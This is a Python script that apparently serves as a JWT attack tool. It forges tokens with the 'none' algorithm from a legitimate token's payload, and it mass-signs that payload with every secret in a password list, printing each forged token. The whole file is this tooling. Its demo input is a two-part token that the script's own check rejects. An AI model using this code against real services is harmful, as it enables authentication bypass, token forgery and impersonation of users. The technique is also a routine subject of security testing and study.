import myb64
import json
import hmac
import hashlib
import time
from jwt import InvalidTokenError 

def isvalid(jwt):
    parts = jwt.split(".")
    if len(parts) == 3 :
        return parts 
    else :
        raise InvalidTokenError

def create_jwt(
    payload: dict,
    secret: str = None,
    algorithm: str = "HS256",
    changedate:bool = False,
    lifetime: int = 3600          
) -> str:
    
    header = {
        "alg": algorithm,
        "typ": "JWT"
    }
    
    
    payload = payload.copy()
    now = int(time.time())
    if changedate :
        payload["iat"] = now           
        payload["exp"] = now + lifetime  
    
    
    header_json = json.dumps(header, separators=(',', ':')).encode('utf-8')
    payload_json = json.dumps(payload, separators=(',', ':')).encode('utf-8')

    b64_header = myb64.base64url_encode(header_json)
    b64_payload = myb64.base64url_encode(payload_json)

   
    signing_input = f"{b64_header}.{b64_payload}".encode('ascii')

   
    if algorithm == "HS256" and secret:
        b64_signature = myb64.base64url_encode(hmac.new(
            key=secret.encode('utf-8'),
            msg=signing_input,
            digestmod=hashlib.sha256
        ).digest())
    elif algorithm == "none" : b64_signature  = ""
    else:
        raise ValueError("Only HS256 is supported in this minimal implementation")

    

  
    return f"{b64_header}.{b64_payload}.{b64_signature}"

def get_line(path):
    with open(path,"r") as f :
        yield from (line.rstrip('\n') for line in f)



"""

--- public API -----

"""


def gen_weak_jwt(legit_jwt):
    try :
        parts = isvalid(legit_jwt)
        return create_jwt(json.loads(myb64.base64url_decode(parts[1])),algorithm="none")
    except Exception as e:
        raise e 
    
def gen_HS256from_pwdlist(legit_jwt,pwdlist):
    try :
        parts = isvalid(legit_jwt)
        payload = json.loads(myb64.base64url_decode(parts[1]))
        for pwd in get_line(pwdlist):
            print(create_jwt(payload,pwd))
    except Exception as e:
        raise e 




if __name__ == "__main__":
    jwt = "eyJ0eXAiOiJKV1QiLA0KICJhbGciOiJIUzI1NiJ9."
    weak = gen_weak_jwt(jwt)
    
    print(f" weak jwt : {weak}\n")

  
   
 
   